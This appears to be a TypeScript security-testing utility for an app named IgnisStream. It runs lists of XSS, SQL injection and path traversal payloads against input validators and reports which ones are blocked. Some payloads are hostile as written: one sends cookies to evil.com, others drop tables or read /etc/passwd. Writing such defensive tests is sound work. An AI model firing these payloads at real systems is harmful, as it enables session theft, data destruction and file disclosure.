/**
 * Security Testing Utilities for IgnisStream
 * Use these utilities to test security implementations
 */

import { z } from 'zod'
import { InputValidator, validationSchemas } from './input-validation'

export class SecurityTestUtils {
  // Common XSS payloads for testing
  static readonly XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(1)">',
    'javascript:alert("XSS")',
    '<svg/onload=alert("XSS")>',
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    "'><script>alert('XSS')</script>",
    '<script>document.cookie="stolen="+document.cookie</script>',
    '<img src=x onerror=fetch("//evil.com?"+document.cookie)>'
  ]

  // Common SQL injection payloads for testing
  static readonly SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "admin'--",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "') OR ('1'='1",
    "1' OR '1'='1' /*",
    "x'; DROP TABLE members; --",
    "1; SELECT * FROM information_schema.tables"
  ]

  // Path traversal payloads
  static readonly PATH_TRAVERSAL_PAYLOADS = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '....//....//....//etc/passwd',
    '..//..//..//etc/passwd',
    '..%252f..%252f..%252fetc%252fpasswd'
  ]

  // Test input validation against XSS
  static testXSSProtection(input: string): { isBlocked: boolean; error?: string } {
    try {
      InputValidator.sanitizeString(input, 1000)
      return { isBlocked: false }
    } catch (error) {
      return { 
        isBlocked: true, 
        error: error instanceof z.ZodError ? error.errors[0].message : 'Unknown error'
      }
    }
  }

  // Test input validation against SQL injection
  static testSQLInjectionProtection(input: string): { isBlocked: boolean; error?: string } {
    try {
      InputValidator.sanitizeString(input, 1000)
      return { isBlocked: false }
    } catch (error) {
      return { 
        isBlocked: true, 
        error: error instanceof z.ZodError ? error.errors[0].message : 'Unknown error'
      }
    }
  }

  // Test file upload security
  static testFileUploadSecurity(
    fileName: string, 
    fileType: string, 
    fileSize: number
  ): { isBlocked: boolean; error?: string } {
    try {
      // Create a mock file object
      const mockFile = {
        name: fileName,
        type: fileType,
        size: fileSize
      } as File

      const allowedTypes = ['image/jpeg', 'image/png', 'image/webp', 'image/gif']
      InputValidator.validateFile(mockFile, allowedTypes, 10 * 1024 * 1024)
      return { isBlocked: false }
    } catch (error) {
      return { 
        isBlocked: true, 
        error: error instanceof z.ZodError ? error.errors[0].message : 'Unknown error'
      }
    }
  }

  // Test URL validation
  static testURLValidation(url: string): { isBlocked: boolean; error?: string } {
    try {
      InputValidator.validateURL(url)
      return { isBlocked: false }
    } catch (error) {
      return { 
        isBlocked: true, 
        error: error instanceof z.ZodError ? error.errors[0].message : 'Unknown error'
      }
    }
  }

  // Run comprehensive security tests
  static runSecurityTests(): SecurityTestResults {
    const results: SecurityTestResults = {
      xssTests: [],
      sqlInjectionTests: [],
      fileUploadTests: [],
      urlTests: [],
      summary: { passed: 0, failed: 0 }
    }

    // Test XSS protection
    this.XSS_PAYLOADS.forEach(payload => {
      const result = this.testXSSProtection(payload)
      results.xssTests.push({
        payload,
        blocked: result.isBlocked,
        error: result.error
      })
      if (result.isBlocked) results.summary.passed++
      else results.summary.failed++
    })

    // Test SQL injection protection
    this.SQL_INJECTION_PAYLOADS.forEach(payload => {
      const result = this.testSQLInjectionProtection(payload)
      results.sqlInjectionTests.push({
        payload,
        blocked: result.isBlocked,
        error: result.error
      })
      if (result.isBlocked) results.summary.passed++
      else results.summary.failed++
    })

    // Test file upload security
    const fileTests = [
      { name: 'malicious.php', type: 'application/x-php', size: 1024 },
      { name: 'script.js', type: 'text/javascript', size: 1024 },
      { name: 'huge-image.jpg', type: 'image/jpeg', size: 50 * 1024 * 1024 },
      { name: '../../../etc/passwd', type: 'text/plain', size: 1024 },
      { name: 'normal-image.jpg', type: 'image/jpeg', size: 1024 * 1024 }
    ]

    fileTests.forEach(test => {
      const result = this.testFileUploadSecurity(test.name, test.type, test.size)
      results.fileUploadTests.push({
        fileName: test.name,
        fileType: test.type,
        fileSize: test.size,
        blocked: result.isBlocked,
        error: result.error
      })
      // For file tests, blocking malicious files is good
      if ((test.name.includes('malicious') || test.name.includes('../') || test.size > 10 * 1024 * 1024) && result.isBlocked) {
        results.summary.passed++
      } else if (test.name === 'normal-image.jpg' && !result.isBlocked) {
        results.summary.passed++
      } else {
        results.summary.failed++
      }
    })

    // Test URL validation
    const urlTests = [
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'ftp://malicious.com/file',
      'http://localhost:3000/admin',
      'https://legitimate-site.com/image.jpg'
    ]

    urlTests.forEach(url => {
      const result = this.testURLValidation(url)
      results.urlTests.push({
        url,
        blocked: result.isBlocked,
        error: result.error
      })
      // Block javascript:, data:, ftp: schemes and localhost in production
      if ((url.startsWith('javascript:') || url.startsWith('data:') || url.startsWith('ftp:') || url.includes('localhost')) && result.isBlocked) {
        results.summary.passed++
      } else if (url.startsWith('https://legitimate-site.com') && !result.isBlocked) {
        results.summary.passed++
      } else {
        results.summary.failed++
      }
    })

    return results
  }

  // Generate security test report
  static generateSecurityReport(results: SecurityTestResults): string {
    const { passed, failed } = results.summary
    const total = passed + failed
    const passRate = ((passed / total) * 100).toFixed(1)

    let report = `
# Security Test Report

## Summary
- **Total Tests**: ${total}
- **Passed**: ${passed}
- **Failed**: ${failed}
- **Pass Rate**: ${passRate}%

## XSS Protection Tests (${results.xssTests.length} tests)
`

    results.xssTests.forEach((test, index) => {
      const status = test.blocked ? '✅ BLOCKED' : '❌ NOT BLOCKED'
      report += `${index + 1}. ${status} - "${test.payload.substring(0, 50)}..."\n`
    })

    report += `\n## SQL Injection Protection Tests (${results.sqlInjectionTests.length} tests)\n`

    results.sqlInjectionTests.forEach((test, index) => {
      const status = test.blocked ? '✅ BLOCKED' : '❌ NOT BLOCKED'
      report += `${index + 1}. ${status} - "${test.payload}"\n`
    })

    report += `\n## File Upload Tests (${results.fileUploadTests.length} tests)\n`

    results.fileUploadTests.forEach((test, index) => {
      const status = test.blocked ? '✅ BLOCKED' : '❌ ALLOWED'
      report += `${index + 1}. ${status} - ${test.fileName} (${test.fileType})\n`
    })

    report += `\n## URL Validation Tests (${results.urlTests.length} tests)\n`

    results.urlTests.forEach((test, index) => {
      const status = test.blocked ? '✅ BLOCKED' : '❌ ALLOWED'
      report += `${index + 1}. ${status} - ${test.url}\n`
    })

    return report
  }

  // Performance test for rate limiting
  static async testRateLimit(
    endpoint: string, 
    maxRequests: number, 
    windowMs: number
  ): Promise<RateLimitTestResult> {
    const startTime = Date.now()
    const results: { status: number; time: number }[] = []

    for (let i = 0; i < maxRequests + 5; i++) {
      try {
        const requestStart = Date.now()
        const response = await fetch(endpoint, { method: 'POST' })
        const requestTime = Date.now() - requestStart

        results.push({
          status: response.status,
          time: requestTime
        })

        // Small delay to avoid overwhelming the server
        await new Promise(resolve => setTimeout(resolve, 10))
      } catch (error) {
        results.push({
          status: 0,
          time: Date.now() - startTime
        })
      }
    }

    const totalTime = Date.now() - startTime
    const rateLimitedRequests = results.filter(r => r.status === 429).length
    const successfulRequests = results.filter(r => r.status === 200).length

    return {
      totalRequests: results.length,
      successfulRequests,
      rateLimitedRequests,
      totalTime,
      averageResponseTime: results.reduce((sum, r) => sum + r.time, 0) / results.length,
      rateLimitingWorking: rateLimitedRequests > 0
    }
  }
}

// Types for test results
interface SecurityTestResults {
  xssTests: Array<{ payload: string; blocked: boolean; error?: string }>
  sqlInjectionTests: Array<{ payload: string; blocked: boolean; error?: string }>
  fileUploadTests: Array<{ 
    fileName: string; 
    fileType: string; 
    fileSize: number; 
    blocked: boolean; 
    error?: string 
  }>
  urlTests: Array<{ url: string; blocked: boolean; error?: string }>
  summary: { passed: number; failed: number }
}

interface RateLimitTestResult {
  totalRequests: number
  successfulRequests: number
  rateLimitedRequests: number
  totalTime: number
  averageResponseTime: number
  rateLimitingWorking: boolean
}

// Export for use in tests
export type { SecurityTestResults, RateLimitTestResult }
